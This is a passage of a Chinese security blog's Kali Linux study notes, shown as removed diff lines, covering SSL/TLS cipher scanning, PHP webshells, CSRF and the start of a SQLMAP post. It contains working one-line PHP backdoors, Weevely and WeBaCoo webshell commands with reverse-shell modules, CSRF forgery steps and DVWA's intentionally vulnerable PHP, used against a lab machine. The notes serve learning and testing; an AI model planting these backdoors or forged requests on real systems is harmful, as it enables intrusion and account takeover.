-<li>SHA-2是TLS1.2唯一支持的单向加密算法</li>
-<li>碰撞攻击针对单向加密算法<ul>
-<li>两个不同的文件生成相同的HASH值</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">HASH算法</th>
-<th align="center">HASH值长度（bit）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">MD5</td>
-<td align="center">128</td>
-</tr>
-<tr>
-<td align="center">SHA-1</td>
-<td align="center">160</td>
-</tr>
-<tr>
-<td align="center">SHA-2</td>
-<td align="center">224、256、384、512</td>
-</tr>
-</tbody></table>
-<h4 id="5-SSL的弱点"><a href="#5-SSL的弱点" class="headerlink" title="5. SSL的弱点"></a>5. SSL的弱点</h4><ul>
-<li>SSL是不同的对称、非对称、单向加密算法的组合加密实现（cipher suite）</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">加密算法</th>
-<th align="center">SSL实现中的用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">RAS/Diffie-Hellman</td>
-<td align="center">密钥交换、身份认证</td>
-</tr>
-<tr>
-<td align="center">AES</td>
-<td align="center">加密数据，由RAS/DH完成密钥交换</td>
-</tr>
-<tr>
-<td align="center">HMAC-SHA2</td>
-<td align="center">摘要信息</td>
-</tr>
-</tbody></table>
-<ul>
-<li>服务器端为提供更好的兼容性，选择支持大量过时的cipher suite</li>
-<li>协商过程中强迫降级加密强度</li>
-<li>现代处理器计算能力可以在可接受的时间内破解时加密算法</li>
-<li>购买云计算资源破解</li>
-</ul>
-<h4 id="6-Openssl"><a href="#6-Openssl" class="headerlink" title="6. Openssl"></a>6. Openssl</h4><ul>
-<li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li>
-<li><strong><code>🔺命令：openssl s_client -connect www.baidu.com:443</code></strong></li>
-<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code></strong> ▲ 2020.1.22 SSL routines:SSL_CTX_set_cipher_list:no cipher match<ul>
-<li>▲ 密钥交换–身份认证–数据加密–HASH算法</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：openssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443</code></strong>（协商低安全级别cipher suite）</li>
-<li>可被破解的cipher suite<ul>
-<li><strong><code>🔺命令：openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code></strong></li>
-</ul>
-</li>
-<li><a href="https://www.openssl.org/docs/apps/ciphers.html" target="_blank" rel="noopener">https://www.openssl.org/docs/apps/ciphers.html</a> （cipher suite的组合）</li>
-<li>Openssl需要大量的密码学相关知识，命令复杂，结果可读性差</li>
-</ul>
-<h4 id="7-SSLScan"><a href="#7-SSLScan" class="headerlink" title="7. SSLScan"></a>7. SSLScan</h4><ul>
-<li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li>
-<li>默认会检查新浪CRIME、heartbleed漏洞</li>
-<li>TLS支持的cipher suite<ul>
-<li><strong><code>🔺命令：sslscan --tlsall www.taobao.com:443</code></strong></li>
-</ul>
-</li>
-<li>分析证书详细数据<ul>
-<li><strong><code>🔺命令：sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="8-SSLyze"><a href="#8-SSLyze" class="headerlink" title="8. SSLyze"></a>8. SSLyze</h4><ul>
-<li>Python语言编写</li>
-<li>检查SSL过时版本</li>
-<li>检查存在弱点的cipher suite</li>
-<li>扫描多站点时，支持来源文件</li>
-<li>检查是否支持会话恢复</li>
-<li><strong><code>🔺命令：sslyze --regular www.baidu.com:443</code></strong></li>
-</ul>
-<h4 id="9-Nmap"><a href="#9-Nmap" class="headerlink" title="9. Nmap"></a>9. Nmap</h4><ul>
-<li><strong><code>🔺命令：nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></strong></li>
-</ul>
-<h4 id="10-QUALYS-SSL-LABS"><a href="#10-QUALYS-SSL-LABS" class="headerlink" title="10. QUALYS SSL LABS"></a>10. QUALYS SSL LABS</h4><ul>
-<li><a href="https://www.sslabs.com/ssltest/" target="_blank" rel="noopener">https://www.sslabs.com/ssltest/</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%9B%9B)%EF%BC%9AWebShell/" itemprop="url">Kali Linux笔记(五十四)：WebShell</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
-                2020-01-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  706 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-WEBSHELL–浏览器"><a href="#1-WEBSHELL–浏览器" class="headerlink" title="1. WEBSHELL–浏览器"></a>1. WEBSHELL–浏览器</h4><ul>
-<li>Shell<ul>
-<li>ssh登陆到metasploitable</li>
-<li><strong><code>🔺命令：vi a.php</code></strong></li>
-<li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li>
-<li><strong><code>🔺命令：cp a.php /var/www</code></strong></li>
-<li>浏览器访问a.php</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用"><a href="#2-WEBSHELL–中国菜刀-▲-2020-1-21暂未使用" class="headerlink" title="2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用"></a>2. WEBSHELL–中国菜刀 ▲ 2020.1.21暂未使用</h4><ul>
-<li>中国菜刀：<a href="http://www.maicaidao.co/（使用unicode编码）" target="_blank" rel="noopener">http://www.maicaidao.co/（使用unicode编码）</a><ul>
-<li>将代码新建到靶机上caidao.php</li>
-<li><code>&lt;?php @eval(_POST[&#39;chopper&#39;]);?&gt;</code></li>
-<li><strong><code>🔺命令：cp caidao.php /var/www</code></strong></li>
-<li>菜刀服务端添加caidao.php的URL，进行配置，输入密码，执行</li>
-</ul>
-</li>
-<li>WebShell可能被IDS、AV、WAF、扫描器软件发现查杀</li>
-</ul>
-<h4 id="3-WEBSHELL–WeBaCoo（PHP）"><a href="#3-WEBSHELL–WeBaCoo（PHP）" class="headerlink" title="3. WEBSHELL–WeBaCoo（PHP）"></a>3. WEBSHELL–WeBaCoo（PHP）</h4><ul>
-<li>WeBaCoo（Web Backdoor Cookie）<ul>
-<li>类终端的shell</li>
-<li>编码通信内容通过cookie头传输，隐蔽性较强</li>
-<li>cm：base64编码的命令</li>
-<li>cn：服务器用于数据的cookie头的名（默认值）</li>
-<li>cp：返回信息定界符（变化的定界符）</li>
-<li>生成服务端</li>
-</ul>
-</li>
-<li>生成服务端<ul>
-<li><strong><code>🔺命令：webacoo -g -o webacoo.php</code></strong></li>
-</ul>
-</li>
-<li>拷贝webacoo.php到服务器端<ul>
-<li><strong><code>🔺命令：scp webacoo.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
-<li>ssh登陆到metasploitable</li>
-<li><strong><code>🔺命令：cp webacoo.php /var/www</code></strong></li>
-</ul>
-</li>
-<li>客户端连接<ul>
-<li><strong><code>🔺命令：webacoo -t -u &quot;http://1.1.1.1/webacoo.php&quot;</code></strong></li>
-</ul>
-</li>
-<li>连接成功会出现命令提示符</li>
-<li>抓包查看cookie</li>
-<li>其他参数<ul>
-<li>-g 生成服务器端代码</li>
-<li>-f 添加执行php操作系统函数</li>
-<li>-r 返回不进行混淆的代码</li>
-<li>-t 远程建立terminal</li>
-<li>-u webacoo URL</li>
-<li>-e 单命令执行模式</li>
-<li>-m HTTP通信方式（默认为Get）</li>
-<li>-c 指定Cookie名字</li>
-<li>-d 定界符</li>
-<li>-a HTTP的user-agent</li>
-<li>-p 代理服务</li>
-<li>-l 记录日志</li>
-<li>update 升级版本</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-WEBSHELL–Weevely（PHP）"><a href="#4-WEBSHELL–Weevely（PHP）" class="headerlink" title="4. WEBSHELL–Weevely（PHP）"></a>4. WEBSHELL–Weevely（PHP）</h4><ul>
-<li>隐藏的类终端PHP Webshell</li>
-<li>30多个管理模块<ul>
-<li>执行系统命令、测试文件系统</li>
-<li>检查服务器常见配置错误</li>
-<li>创建正向、反向TCP Shell连接</li>
-<li>通过目标计算机代理HTTP流量</li>
-<li>从目标计算机运行端口扫描，渗透内网</li>
-</ul>
-</li>
-<li>支持连接密码</li>
-<li>Kali缺少库 ▲ 2020.1.21已支持该库<ul>
-<li><a href="https://pypi.python.org/pypi/PySocks/" target="_blank" rel="noopener">https://pypi.python.org/pypi/PySocks/</a></li>
-<li><strong><code>🔺命令：./setup.py install</code></strong></li>
-</ul>
-</li>
-<li>生成服务端<ul>
-<li><strong><code>🔺命令：weevely generate &lt;password&gt; wee.php</code></strong> </li>
-<li>/usr/share/weevely/wee.php ▲ 2020.1.21生成程序在终端所在位置</li>
-</ul>
-</li>
-<li>拷贝wee.php到服务器端<ul>
-<li><strong><code>🔺命令：scp wee.php msfadmin@192.168.1.115:/home/msfadmin</code></strong></li>
-<li><strong><code>🔺命令：cp wee.php /var/www</code></strong></li>
-</ul>
-</li>
-<li>客户端连接服务器<ul>
-<li><strong><code>🔺命令：weevely http://1.1.1.1/wee.php &lt;password&gt;</code></strong></li>
-</ul>
-</li>
-<li>抓包查看HTTP头（过滤：tcp.stream eq 5）</li>
-<li>▲ 通过Referer、Cookie、body进行传输，解码可用Base64解码</li>
-<li>help（查看模块）<ul>
-<li>audit_sgidsgid（SUID+SGID）</li>
-<li>audit_filesystem（查找文件设置权限）</li>
-<li>audit_phpconf（审计php的配置信息）</li>
-<li>system_info（操作系统配置）</li>
-<li>backdoor_tcp（本地监听一个shell在TCP端口上）</li>
-<li>backdoor_reversetcp（本地监听反弹一个shell）</li>
-<li>bruteforce_sql（SQL注入的暴力破解）</li>
-<li>net_proxy（把靶机变成代理服务器，但代理IP端口都设置在攻击者上）</li>
-<li>net_phpproxy（php代理，需要安装一个php代理在靶机上）</li>
-<li>net_scan IP:端口（把靶机作为扫描器）</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/21/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%89)%EF%BC%9ACSRF/" itemprop="url">Kali Linux笔记(五十三)：CSRF</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-21T20:40:16+08:00">
-                2020-01-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.1k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-CSRF"><a href="#1-CSRF" class="headerlink" title="1. CSRF"></a>1. CSRF</h4><ul>
-<li>Cross-site request forgery</li>
-<li>与XSS经常混淆</li>
-<li>从信任的角度来区分<ul>
-<li>XSS：利用用户对站点的信任</li>
-<li>CSRF：利用站点对已经身份认证的信任</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐CSRF过程
-1.客户端向服务器发送请求，获得身份认证Token
-2.Hacker向客户端发送一个伪造定制页面，诱使客户端点击页面
-3.客户端点击页面，页面通过客户端的Token提交数据指令给服务器端
-4.服务器端未进行对请求来源的验证，只验证Session是否合法性
-▲ 二次认证，随机数机制，验证码机制一定程度上可以防控CSRF漏洞</code></pre></blockquote>
-<ul>
-<li>结合社工在身份认证会话过程中实现攻击<ul>
-<li>修改账号密码、个人信息（email、收获地址）</li>
-<li>发送伪造的业务请求（网银、购物、投票）</li>
-<li>关注他人社交账号，推送博文</li>
-<li>▲ 在用户非自愿、不知情的情况下提交请求</li>
-</ul>
-</li>
-<li>业务逻辑漏洞<ul>
-<li>对关键操作缺少确认机制</li>
-<li>自动扫描程序无法发现此类漏洞</li>
-</ul>
-</li>
-<li>漏洞利用条件<ul>
-<li>被害用户已经完成身份认证</li>
-<li>新请求的提交不需要重新身份认证或确认机制</li>
-<li>攻击者必须了解Web Application请求的参数构造</li>
-<li>诱使用户触发攻击的指令（社工）</li>
-</ul>
-</li>
-<li>▲ 自动扫描程序的检测方法<ul>
-<li>在请求和响应过程中检查是否存在anti-CSRF token名（随机数验证）</li>
-<li>检查服务器是否验证anti-CSRF token的名值（服务器端是否验证token正确性）</li>
-<li>检查token中是否可编辑的字符串</li>
-<li>检查referer头是否可以伪造</li>
-</ul>
-</li>
-<li>对策<ul>
-<li>Captcha（验证码机制）</li>
-<li>anti-CSRF token（使用最广）</li>
-<li>Referer头</li>
-<li>降低会话超时时间</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-CSRF–漏洞利用方法"><a href="#2-CSRF–漏洞利用方法" class="headerlink" title="2. CSRF–漏洞利用方法"></a>2. CSRF–漏洞利用方法</h4><ul>
-<li>CSRF → Get方法<ul>
-<li>Kali开启apach服务</li>
-<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-get.html</code></strong></li>
-<li><code>&lt;a href=&quot;Burpsuit抓取的地址/URL地址抓取&quot;&gt;csrf&lt;/a&gt;</code></li>
-<li>window上访问csrf-get.html</li>
-</ul>
-</li>
-<li>CSRF → Post方法<ul>
-<li>View Source查看页面的源代码</li>
-<li>保存表单form的内容存成一个页面，csrf-post.html</li>
-<li>诱使用户点击</li>
-</ul>
-</li>
-<li>Burpsuit → 右键请求 → Engagement tools → Generate CSRF Poc ▲ 2020.1.21只有Burpsuite Professional版本才有此功能<ul>
-<li>Burpsuit自动生成CSRF生成的一个页面</li>
-<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-post-burp.html</code></strong></li>
-<li>window上访问csrf-post-burp.html</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-CSRF–DVWA"><a href="#3-CSRF–DVWA" class="headerlink" title="3. CSRF–DVWA"></a>3. CSRF–DVWA</h4><ul>
-<li>Dvwa中的CSRF（Low）<ul>
-<li>多种绕过方式</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">                </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Dvwa中的CSRF（Medium）<ul>
-<li>eregi()函数，取HTTP_REFERER进行比较判断</li>
-<li>绕过方法：Burpsuite抓包截断进行修改HTTP头的Referer参数</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Checks the http referer header</span><br><span class="line">        if ( eregi ( &quot;127.0.0.1&quot;, $_SERVER[&apos;HTTP_REFERER&apos;] ) )&#123;</span><br><span class="line">    </span><br><span class="line">            // Turn requests into variables</span><br><span class="line">            $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">            $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">            if ($pass_new == $pass_conf)&#123;</span><br><span class="line">                $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">                $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">                $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">                $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">                echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">                mysql_close();</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            else&#123;        </span><br><span class="line">                echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            </span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Dvwa中的CSRF（High）<ul>
-<li>表单加入当前密码认证（二次认证）</li>
-<li>基本无绕过方式</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_curr = $_GET[&apos;password_current&apos;];</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">        // Sanitise current password input</span><br><span class="line">        $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">        $pass_curr = mysql_real_escape_string( $pass_curr );</span><br><span class="line">        $pass_curr = md5( $pass_curr );</span><br><span class="line">        </span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $qry = &quot;SELECT password FROM `users` WHERE user=&apos;admin&apos; AND password=&apos;$pass_curr&apos;;&quot;;</span><br><span class="line">        $result = mysql_query($qry) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf) &amp;&amp; ( $result &amp;&amp; mysql_num_rows( $result ) == 1 ))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match or current password incorrect. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/" itemprop="url">Kali Linux笔记(五十一)：SQLMAP</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-15T14:12:52+08:00">
-                2020-01-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  3.2k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  14 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-SQLMAP自动注入"><a href="#1-SQLMAP自动注入" class="headerlink" title="1. SQLMAP自动注入"></a>1. SQLMAP自动注入</h4><ul>
-<li>开源sql注入漏洞检测、利用工具（python语言开发）</li>
-<li>检测动态页面中get/post参数、cookie、http头</li>
-<li>数据榨取</li>
-<li>文件系统访问</li>
-<li>操作系统命令执行</li>
-<li>引擎强大、特性丰富</li>
-<li>XSS漏洞检测</li>
-</ul>
-<blockquote>
